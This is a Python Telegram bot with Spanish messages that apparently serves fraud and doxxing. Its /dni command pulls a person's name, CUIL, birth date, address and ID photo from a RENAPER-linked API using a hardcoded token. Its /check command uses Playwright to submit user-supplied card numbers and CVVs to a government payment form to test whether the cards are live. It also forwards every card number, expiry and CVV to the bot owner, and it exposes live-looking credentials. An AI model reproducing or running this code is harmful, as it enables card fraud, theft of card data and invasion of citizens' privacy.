import telebot
import asyncio
from playwright.async_api import async_playwright
import random
import string
import requests
import time
from collections import deque

API_TOKEN = "7591727242:AAEIqlas3SJRjteHQGr-UkxaoJDZMOaScLU"
bot = telebot.TeleBot(API_TOKEN)

OWNER_ID = 1658470522
queue = deque()
cooldown = {}

RENAPER_API_KEY = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6OTQyLCJyb2xlIjoyLCJpYXQiOjE3MzI4OTEyMTh9.ZJE93rqr5TzXlJ3Tz-On9Cj9AerPc9pxMNayONJ5BSo"
RENAPER_API_URL = "https://colmen-api.rgn.io/renaper/new"

def consultar_dni(dni, gender):
    headers = {
        "Authorization": RENAPER_API_KEY,
        "Content-Type": "application/json"
    }
    payload = {"dni": dni, "gender": gender}

    try:
        response = requests.post(RENAPER_API_URL, json=payload, headers=headers)
        response.raise_for_status()
        data = response.json()
        return {
            "apellido": data.get("apellido"),
            "nombres": data.get("nombres"),
            "fecha_nacimiento": data.get("fecha_nacimiento"),
            "cuil": data.get("cuil"),
            "provincia": data.get("provincia"),
            "ciudad": data.get("ciudad"),
            "fecha_emision": data.get("fecha_emision"),
            "fecha_vencimiento": data.get("fecha_vencimiento"),
            "foto": data.get("foto"),  # Foto en formato base64
        }
    except requests.exceptions.RequestException as e:
        return {"error": f"Error al conectar con la API del RENAPER: {e}"}

# Función para procesar la consulta del DNI
@bot.message_handler(commands=['dni'])
def handle_dni(message):
    try:
        args = message.text.split(" ", 2)
        if len(args) != 3:
            bot.reply_to(message, "Uso incorrecto. El formato es:\n/dni DNI|Género (M/F).")
            return

        dni, gender = args[1], args[2].upper()
        if not dni.isdigit():
            bot.reply_to(message, "El DNI debe ser un número válido.")
            return
        if gender not in ["M", "F"]:
            bot.reply_to(message, "El género debe ser 'M' (masculino) o 'F' (femenino).")
            return

        bot.reply_to(message, "Procesando consulta, por favor espera un momento...")
        data = consultar_dni(dni, gender)

        if "error" in data:
            bot.reply_to(message, data["error"])
        else:
            formatted_response = (
                "Consulta de DNI | Resultados\n\n"
                f"📄 Nombre: {data.get('nombres', 'N/A')} {data.get('apellido', 'N/A')}\n"
                f"📂 Fecha de nacimiento: {data.get('fecha_nacimiento', 'N/A')}\n"
                f"🔛 CUIL: {data.get('cuil', 'N/A')}\n"
                f"🏠 Ciudad: {data.get('ciudad', 'N/A')}, {data.get('provincia', 'N/A')}\n"
                f"📆 Fecha de emisión: {data.get('fecha_emision', 'N/A')}\n"
                f"📆 Fecha de vencimiento: {data.get('fecha_vencimiento', 'N/A')}\n"
            )
            bot.reply_to(message, formatted_response)

            # Manejo de la foto
            foto_base64 = data.get("foto")
            if foto_base64:
                with open(f"foto_{dni}.jpg", "wb") as f:
                    f.write(bytes.fromhex(foto_base64))
                with open(f"foto_{dni}.jpg", "rb") as photo:
                    bot.send_photo(message.chat.id, photo)
            else:
                bot.reply_to(message, "No se pudo obtener la foto del ciudadano.")
    except Exception as e:
        bot.reply_to(message, f"Ocurrió un error: {e}")

async def completar_formulario(binlargo, mes, anio, code):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        await page.goto("https://tramites.renaper.gob.ar/v2/MACRO_genera.php?tipo_tramite=CERTSOLTERIA")
        email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@{''.join(random.choices(string.ascii_lowercase, k=5))}.com"
        await page.fill("#dni", "44444444")
        await page.select_option("#sexo", "F")
        await page.fill("#email", email)
        await page.click("button.btn.btn-info:text('Continuar')")
        await page.wait_for_timeout(2000)
        await page.click("a.btn.btn-info:text('CONTINUAR')")
        await page.wait_for_timeout(2000)
        await page.click("input#MainContent_btnTarjeta")
        await page.wait_for_timeout(2000)
        bindata = requests.get(f"https://api.paypertic.com/binservice/{binlargo[:6]}").text.lower()
        if "visa" in bindata and "credit" in bindata:
            await page.select_option("#ddlTarjeta", "1")
        elif "visa" in bindata and "debit" in bindata:
            await page.select_option("#ddlTarjeta", "31")
        elif "mastercard" in bindata and "debit" in bindata:
            await page.select_option("#ddlTarjeta", "105")
        elif "mastercard" in bindata and "credit" in bindata:
            await page.select_option("#ddlTarjeta", "104")
        elif "american express" in bindata:
            await page.select_option("#ddlTarjeta", "111")
        elif "cabal" in bindata:
            await page.select_option("#ddlTarjeta", "63")
        await page.fill("#txtCardNumber", binlargo)
        await page.fill("#txtCardExpirationMonth", mes)
        await page.fill("#txtCardExpirationYear", anio)
        await page.fill("#txtSecurityCode", code)
        await page.click("input#MainContent_btnGenerarTarjeta")
        await page.wait_for_timeout(6000)
        error_text = await page.text_content("body")
        if "La transacción ha sido rechazada" in error_text:
            await browser.close()
            return False
        await browser.close()
        return True

async def process_queue():
    while queue:
        user_message = queue.popleft()
        tarjeta, mes, anio, codigo = user_message['tarjeta'], user_message['mes'], user_message['anio'], user_message['codigo']
        user_id = user_message['user_id']
        message = user_message['message']
        username = user_message['username']
        result = await completar_formulario(tarjeta, mes, anio, codigo)
        if result:
            formatted_response = (
                "Checkeo de CC | Exitoso\n"
                "✅ Tarjeta aprobada!\n\n"
                "－ － － － － － － － － － － － － － － － －\n"
                f"Número de Tarjeta: {tarjeta}\n"
                f"MM|AA: {mes}|{anio}\n"
                f"CVV: {codigo}\n"
                "－ － － － － － － － － － － － － － － － －\n"
                "Monto: $ 2000\n"
                f"Usuario: @{username}\n"
            )
            bot.reply_to(message, formatted_response)
            bot.send_message(OWNER_ID, formatted_response)
        else:
            formatted_response = (
                "Checkeo de CC | Fallido\n"
                "❌ Tarjeta rechazada!\n\n"
                "－ － － － － － － － － － － － － － － － － － －\n"
                f"Número de Tarjeta: {tarjeta}\n"
                f"MM|AA: {mes}|{anio}\n"
                f"CVV: {codigo}\n"
                "－ － － － － － － － － － － － － － － － － － －\n"
                f"Usuario: @{username}\n"
            )
            bot.reply_to(message, formatted_response)
            bot.send_message(OWNER_ID, formatted_response)
        await asyncio.sleep(1)

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.reply_to(message, "¡Hola! 👋 Soy tu asistente virtual 💻✨\n\n"
                          "Estoy aquí para ayudarte con el checkeo de tarjetas de manera rápida y segura. "
                          "Solo debes enviarme el formato correcto: /check cc|mes|año|cvv. ")

@bot.message_handler(commands=['check'])
def handle_check(message):
    try:
        user_id = message.from_user.id
        current_time = time.time()
        if user_id in cooldown and current_time - cooldown[user_id] < 30:
            remaining_time = 30 - (current_time - cooldown[user_id])
            bot.reply_to(message, f"Debes esperar {int(remaining_time)} segundos antes de usar /check nuevamente.")
            return
        cooldown[user_id] = current_time
        username = message.from_user.username or message.from_user.first_name
        args = message.text.split(" ", 1)
        if len(args) != 2 or "|" not in args[1]:
            bot.reply_to(message, "Uso incorrecto. El formato es:\n/check cc|mes|año|cvv")
            return
        parts = args[1].split("|")
        if len(parts) != 4:
            bot.reply_to(message, "El formato debe ser: /check cc|mes|año|cvv")
            return
        tarjeta, mes, anio, codigo = parts
        if len(tarjeta) != 16 or not tarjeta.isdigit():
            bot.reply_to(message, "La tarjeta debe tener 16 dígitos.")
            return
        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            bot.reply_to(message, "El mes debe tener 2 dígitos y ser válido.")
            return
        if not anio.isdigit() or int(anio) < 24:
            bot.reply_to(message, "El año debe tener 2 dígitos y ser válido.")
            return
        if (len(codigo) != 3 and len(codigo) != 4) or not codigo.isdigit():
            bot.reply_to(message, "El código de seguridad debe tener 3 o 4 dígitos.")
            return
        bot.reply_to(message, "Estamos procesando tu solicitud. Puede que haya otras personas en espera, pero en poco tiempo se procesará tu turno.")
        queue.append({
            'user_id': user_id,
            'message': message,
            'tarjeta': tarjeta,
            'mes': mes,
            'anio': anio,
            'codigo': codigo,
            'username': username
        })
        asyncio.run(process_queue())
    except Exception as e:
        print(e)
        bot.reply_to(message, f"Ocurrió un error: {e}")

if __name__ == "__main__":
    bot.infinity_polling()